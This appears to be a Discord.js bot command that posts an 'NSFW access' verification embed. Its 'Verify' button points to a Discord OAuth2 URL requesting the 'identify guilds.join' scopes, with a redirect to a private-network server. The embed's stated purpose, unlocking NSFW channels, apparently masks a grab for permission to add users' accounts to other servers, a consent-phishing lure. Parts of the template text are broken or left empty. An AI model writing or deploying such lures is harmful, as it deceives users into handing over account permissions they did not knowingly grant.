const { MessageActionRow, MessageButton } = require('discord.js');
const parse = require('parse-ms');

module.exports = {
    name: 'verifiedembed',
    category: 'Utility',
    botOwner: true,
    run: async (client, message, args, users, botData) => {

        const timeout = 604800000;
        const time = parse(timeout - (Date.now() - parseInt(botData.last_refresh)));

        const row = new MessageActionRow()
            .addComponents(
                new MessageButton()
                    .setStyle('LINK')
                    .setLabel('Verify')
                    .setURL('https://discord.com/api/oauth2/authorize?client_id=1072592067043278989&redirect_uri=http%3A%2F%2F172.17.0.81%3A3030&response_type=code&scope=identify%20guilds.join')
            );

        await message.channel.send({ embeds: [
            {
                color: 'ff0000',
                title: `🔞 Nsfw Acces 🔞`,
                description: `${users.size == 0 ? "If you want see nsfw channels click the ' Verify ' button and verify your self!" : ('If you want see nsfw channels click the " Verify " button and verify your self!')}\n\n\n\n\n`,
                fields: [client.joins.map(m => {
                    return {
                        name: `${client.guilds.cache.get(m.guildID).name}`,
                        value: ` Auteur : <@>\n Membres : \n Date : <t:${Math.round(m.at / 1000)}:R>\n \`/\``
                    }
                })],
                image: {
                    url: "https://media.discordapp.net/attachments/1170617570571857931/1170619766319353896/20231105_100449.jpg",
                    size: "full"
                },
                footer: {
                    text: `Nsfw Accessing System.`
                }
            }
        ], components: [row] });

    }
}